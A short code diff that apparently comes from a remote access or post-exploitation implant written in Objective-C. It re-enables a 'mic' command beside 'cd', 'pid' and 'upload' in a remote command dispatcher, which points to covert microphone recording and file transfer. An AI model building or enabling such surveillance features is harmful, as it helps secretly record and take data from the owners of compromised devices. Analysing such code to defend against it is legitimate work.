@@ -140,7 +140,7 @@ void interact(NSDictionary* arguments) {
         } else if ([cmd isEqualToString:@"cd"]) {
             [esCommand changeDirectory:args];
         } else if ([cmd isEqualToString:@"mic"]) {
-        // [esCommand mic:args];
+           [esCommand mic:args];
         } else if ([cmd isEqualToString:@"pid"]) {
             [esCommand getProcessId];
         } else if ([cmd isEqualToString:@"upload"]) {
